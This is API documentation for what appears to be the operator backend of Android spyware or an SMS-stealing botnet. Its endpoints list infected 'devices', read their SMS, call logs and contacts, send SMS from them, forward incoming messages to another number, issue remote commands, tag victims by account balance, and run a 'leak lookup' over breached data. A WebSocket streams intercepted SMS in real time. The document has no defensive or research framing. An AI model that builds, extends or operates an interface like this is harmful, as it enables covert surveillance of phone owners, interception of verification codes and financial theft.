# API Documentation

## Base URL

The API base URL is configured in `lib/core/constants/api_constants.dart`.

## Authentication

### Login
**POST** `/api/auth/login`

Request:
```json
{
  "username": "string",
  "password": "string"
}
```

Response:
```json
{
  "success": true,
  "token": "string",
  "temp_token": "string",
  "expires_in": 300
}
```

### Verify OTP
**POST** `/api/auth/verify-otp`

Request:
```json
{
  "token": "string",
  "otp": "string"
}
```

Response:
```json
{
  "success": true,
  "token": "string",
  "admin": { ... }
}
```

### Check Auth Status
**GET** `/api/auth/status`

Headers:
- `Authorization: Bearer {token}`

Response:
```json
{
  "authenticated": true,
  "admin": { ... }
}
```

## Devices

### Get All Devices
**GET** `/api/devices`

Headers:
- `Authorization: Bearer {token}`

Response:
```json
{
  "devices": [
    {
      "device_id": "string",
      "model": "string",
      "manufacturer": "string",
      "status": "active|pending",
      "battery_level": 85,
      "last_ping": "2024-01-01T00:00:00Z",
      ...
    }
  ]
}
```

### Get Device
**GET** `/api/devices/{deviceId}`

Headers:
- `Authorization: Bearer {token}`

Response:
```json
{
  "device_id": "string",
  "model": "string",
  ...
}
```

### Send Command
**POST** `/api/devices/{deviceId}/command`

Headers:
- `Authorization: Bearer {token}`

Request:
```json
{
  "command": "string",
  "parameters": {}
}
```

### Send SMS
**POST** `/api/devices/{deviceId}/sms/send`

Headers:
- `Authorization: Bearer {token}`

Request:
```json
{
  "phone_number": "string",
  "message": "string"
}
```

### Update Settings
**PUT** `/api/devices/{deviceId}/settings`

Headers:
- `Authorization: Bearer {token}`

Request:
```json
{
  "sms_forward_enabled": true,
  "forward_number": "string",
  "monitoring_enabled": true
}
```

### Add Note
**POST** `/api/devices/{deviceId}/note`

Headers:
- `Authorization: Bearer {token}`

Request:
```json
{
  "priority": "lowbalance|highbalance|none",
  "message": "string"
}
```

## SMS

### Get SMS Messages
**GET** `/api/devices/{deviceId}/sms`

Query Parameters:
- `type`: `inbox|outbox|all`
- `page`: `number`
- `limit`: `number`
- `search`: `string`

## Calls

### Get Call Logs
**GET** `/api/devices/{deviceId}/calls`

Query Parameters:
- `type`: `incoming|outgoing|missed|all`
- `page`: `number`
- `limit`: `number`
- `search`: `string`

## Contacts

### Get Contacts
**GET** `/api/devices/{deviceId}/contacts`

Query Parameters:
- `search`: `string`

## Admins

### Get All Admins
**GET** `/api/admins`

Headers:
- `Authorization: Bearer {token}`

### Create Admin
**POST** `/api/admins`

Request:
```json
{
  "username": "string",
  "password": "string",
  "email": "string",
  "full_name": "string",
  "is_super_admin": false
}
```

### Update Admin
**PUT** `/api/admins/{adminId}`

### Delete Admin
**DELETE** `/api/admins/{adminId}`

### Get Activity Logs
**GET** `/api/admins/activity-logs`

Query Parameters:
- `page`: `number`
- `limit`: `number`
- `admin_id`: `string`

## Tools

### Leak Lookup
**POST** `/api/tools/leak-lookup`

Request:
```json
{
  "query": "string",
  "limit": 100,
  "lang": "en|ru|hi"
}
```

## WebSocket

### Connection
**WS** `/ws`

After connection, subscribe to events:
```json
{
  "action": "subscribe",
  "device_id": "string"
}
```

### Events

#### Device Update
```json
{
  "type": "device_update",
  "device_id": "string",
  "data": { ... }
}
```

#### SMS
```json
{
  "type": "sms",
  "device_id": "string",
  "sms": { ... }
}
```

#### SMS Update
```json
{
  "type": "sms_update",
  "device_id": "string",
  "sms": { ... }
}
```

## Error Responses

All endpoints may return errors:

```json
{
  "success": false,
  "error": "string",
  "message": "string"
}
```

Common HTTP status codes:
- `200`: Success
- `400`: Bad Request
- `401`: Unauthorized
- `403`: Forbidden
- `404`: Not Found
- `500`: Internal Server Error

## Rate Limiting

API requests are rate-limited. Check response headers:
- `X-RateLimit-Limit`: Request limit
- `X-RateLimit-Remaining`: Remaining requests
- `X-RateLimit-Reset`: Reset time






